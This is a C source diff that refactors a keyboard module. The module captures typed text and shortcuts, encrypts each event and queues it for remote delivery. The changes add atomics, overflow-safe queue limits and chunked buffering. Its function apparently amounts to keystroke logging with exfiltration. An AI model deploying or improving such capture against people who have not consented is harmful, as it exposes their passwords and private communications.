@@ -25,6 +25,7 @@
 #include "keyboard.h"
 
 #include <stdint.h>
+#include <stdatomic.h>
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
@@ -155,7 +156,7 @@ static size_t retry_delay_ms;
 static size_t inactivity_flush_ms;
 static int stopping;
 static int worker_started;
-static volatile int keyboard_paused;
+static atomic_int keyboard_paused;
 static uint64_t total_keyboard_bytes;
 static uint64_t total_keyboard_keystrokes;
 
@@ -228,7 +229,8 @@ static void enqueue_locked(const void *data, size_t length) {
 
   size_t allocation_size = sizeof(keyboard_event_t) + length;
   if (maximum_queue_bytes > 0 &&
-      queue_bytes + allocation_size > maximum_queue_bytes) {
+      (queue_bytes >= maximum_queue_bytes ||
+       allocation_size > maximum_queue_bytes - queue_bytes)) {
     c2t_log_warning("keyboard", "Queue byte limit exceeded; discarding event");
     return;
   }
@@ -260,9 +262,7 @@ static void enqueue_locked(const void *data, size_t length) {
 
   if (!c2t_crypto_get_random_bytes(event->nonce, C2T_CRYPTO_NONCE_SIZE)) {
     c2t_log_error("keyboard", "Failed to generate nonce for keyboard event");
-    if ((unsigned char *)event >= keyboard_arena.buffer &&
-        (unsigned char *)event <
-            keyboard_arena.buffer + keyboard_arena.capacity) {
+    if (c2t_arena_contains(&keyboard_arena, event)) {
       c2t_secure_zero(event, allocation_size);
     } else {
       c2t_secure_zero(event, allocation_size);
@@ -272,9 +272,7 @@ static void enqueue_locked(const void *data, size_t length) {
   }
   if (!c2t_crypto_encrypt(data, length, event->nonce, event->encrypted_data)) {
     c2t_log_error("keyboard", "Encryption failed for keyboard payload");
-    if ((unsigned char *)event >= keyboard_arena.buffer &&
-        (unsigned char *)event <
-            keyboard_arena.buffer + keyboard_arena.capacity) {
+    if (c2t_arena_contains(&keyboard_arena, event)) {
       c2t_secure_zero(event, allocation_size);
     } else {
       c2t_secure_zero(event, allocation_size);
@@ -312,23 +310,32 @@ void keyboard_output_flush(void) {
 }
 
 void keyboard_output_append(const char *text, size_t length) {
-  if (!text || length == 0 || keyboard_paused)
+  if (!text || length == 0 || keyboard_is_paused())
     return;
 
   queue_lock();
   total_keyboard_keystrokes += length;
 
-  for (size_t i = 0; i < length; i++) {
-    char ch = text[i];
-    if (text_buffer_len + 1 >= KEYBOARD_BUFFER_CAPACITY) {
+  size_t consumed = 0;
+  while (consumed < length) {
+    size_t available = KEYBOARD_BUFFER_CAPACITY - 1U - text_buffer_len;
+    if (available == 0) {
       flush_buffer_locked();
+      available = KEYBOARD_BUFFER_CAPACITY - 1U;
     }
 
-    text_buffer[text_buffer_len++] = ch;
+    size_t remaining = length - consumed;
+    size_t chunk = remaining < available ? remaining : available;
+    const char *newline = memchr(text + consumed, '\n', chunk);
+    if (newline)
+      chunk = (size_t)(newline - (text + consumed)) + 1U;
 
-    if (ch == '\n') {
+    memcpy(text_buffer + text_buffer_len, text + consumed, chunk);
+    text_buffer_len += chunk;
+    consumed += chunk;
+
+    if (newline || text_buffer_len == KEYBOARD_BUFFER_CAPACITY - 1U)
       flush_buffer_locked();
-    }
   }
 
   last_key_time_ms = get_monotonic_ms();
@@ -337,7 +344,7 @@ void keyboard_output_append(const char *text, size_t length) {
 }
 
 void keyboard_output_backspace(void) {
-  if (keyboard_paused)
+  if (keyboard_is_paused())
     return;
 
   queue_lock();
@@ -348,29 +355,32 @@ void keyboard_output_backspace(void) {
     while (pos > 0 && ((unsigned char)text_buffer[pos] & 0xC0) == 0x80) {
       --pos;
     }
-    for (size_t i = pos; i < text_buffer_len; i++) {
-      text_buffer[i] = '\0';
-    }
+    memset(text_buffer + pos, 0, text_buffer_len - pos);
     text_buffer_len = pos;
     last_key_time_ms = get_monotonic_ms();
   }
   queue_unlock();
 }
 
-static volatile int keyboard_shortcuts_enabled = 0;
+static atomic_int keyboard_shortcuts_enabled;
 
-int keyboard_get_shortcuts_enabled(void) { return keyboard_shortcuts_enabled; }
+int keyboard_get_shortcuts_enabled(void) {
+  return atomic_load_explicit(&keyboard_shortcuts_enabled,
+                              memory_order_relaxed);
+}
 
 void keyboard_set_shortcuts_enabled(int enabled) {
-  keyboard_shortcuts_enabled = enabled ? 1 : 0;
+  atomic_store_explicit(&keyboard_shortcuts_enabled, enabled ? 1 : 0,
+                        memory_order_relaxed);
 }
 
 int keyboard_toggle_shortcuts(void) {
-  keyboard_shortcuts_enabled = !keyboard_shortcuts_enabled;
-  return keyboard_shortcuts_enabled;
+  return atomic_fetch_xor_explicit(&keyboard_shortcuts_enabled, 1,
+                                   memory_order_relaxed) ^
+         1;
 }
 
-static volatile int keyboard_format_mode = KEYBOARD_MODE_CODE;
+static atomic_int keyboard_format_mode = KEYBOARD_MODE_CODE;
 
 static void deliver_event(const keyboard_event_t *event) {
   for (size_t attempt = 1; attempt <= delivery_attempts; ++attempt) {
@@ -443,22 +453,20 @@ static void *delivery_worker([[maybe_unused]] void *context)
 
       deliver_event(event);
 
+      size_t allocation_size = event->allocation_size;
+      int arena_owned = c2t_arena_contains(&keyboard_arena, event);
       queue_lock();
-      queue_bytes -= event->allocation_size;
+      queue_bytes -= allocation_size;
       --queue_items;
-      if (queue_items == 0) {
+      if (arena_owned && queue_items == 0) {
         c2t_arena_reset(&keyboard_arena);
+      } else {
+        c2t_secure_zero(event, allocation_size);
       }
       queue_unlock();
 
-      if ((unsigned char *)event >= keyboard_arena.buffer &&
-          (unsigned char *)event <
-              keyboard_arena.buffer + keyboard_arena.capacity) {
-        c2t_secure_zero(event, event->allocation_size);
-      } else {
-        c2t_secure_zero(event, event->allocation_size);
+      if (!arena_owned)
         free(event);
-      }
     } else {
       queue_unlock();
     }
@@ -472,18 +480,28 @@ static void *delivery_worker([[maybe_unused]] void *context)
 #endif
 }
 
-int keyboard_is_paused(void) { return keyboard_paused; }
-
-void keyboard_set_paused(int paused) { keyboard_paused = paused; }
-
-int keyboard_toggle_paused(void) {
-  keyboard_paused = !keyboard_paused;
-  return keyboard_paused;
+int keyboard_is_paused(void) {
+  return atomic_load_explicit(&keyboard_paused, memory_order_relaxed);
 }
 
-void keyboard_set_format_mode(int mode) { keyboard_format_mode = mode; }
+void keyboard_set_paused(int paused) {
+  atomic_store_explicit(&keyboard_paused, paused ? 1 : 0,
+                        memory_order_relaxed);
+}
 
-int keyboard_get_format_mode(void) { return keyboard_format_mode; }
+int keyboard_toggle_paused(void) {
+  return atomic_fetch_xor_explicit(&keyboard_paused, 1,
+                                   memory_order_relaxed) ^
+         1;
+}
+
+void keyboard_set_format_mode(int mode) {
+  atomic_store_explicit(&keyboard_format_mode, mode, memory_order_relaxed);
+}
+
+int keyboard_get_format_mode(void) {
+  return atomic_load_explicit(&keyboard_format_mode, memory_order_relaxed);
+}
 
 void keyboard_get_status_info(char *buffer, size_t max_len) {
   if (!buffer || max_len == 0)
@@ -531,7 +549,7 @@ void keyboard_get_status_info(char *buffer, size_t max_len) {
            "• <b>Inactivity Flush:</b> %llu ms",
            paused ? "⏸️ <b>PAUSED</b> (Muted)" : "🟢 <b>ACTIVE</b> (Capturing)",
            layout_name,
-           keyboard_shortcuts_enabled
+           keyboard_get_shortcuts_enabled()
                ? "🟢 <b>ENABLED</b> (Capturing [Ctrl+C], [Alt+...], etc.)"
                : "⚪ <b>DISABLED</b> (Clean typing text only)",
            tot_str, (unsigned long long)tot_keys,
@@ -572,9 +590,9 @@ int keyboard_output_init(void) {
   inactivity_flush_ms = c2t_config_get()->keyboard_flush_ms > 0
                             ? c2t_config_get()->keyboard_flush_ms
                             : KEYBOARD_DEFAULT_FLUSH_MS;
-  keyboard_shortcuts_enabled = c2t_config_get()->keyboard_shortcuts;
+  keyboard_set_shortcuts_enabled(c2t_config_get()->keyboard_shortcuts);
   stopping = 0;
-  keyboard_paused = 0;
+  keyboard_set_paused(0);
   text_buffer_len = 0;
   last_key_time_ms = 0;
 
@@ -627,9 +645,7 @@ void keyboard_output_cleanup(void) {
     keyboard_event_t *event = queue_head;
     queue_head = event->next;
     c2t_secure_zero(event, event->allocation_size);
-    if ((unsigned char *)event < keyboard_arena.buffer ||
-        (unsigned char *)event >=
-            keyboard_arena.buffer + keyboard_arena.capacity) {
+    if (!c2t_arena_contains(&keyboard_arena, event)) {
       free(event);
     }
   }
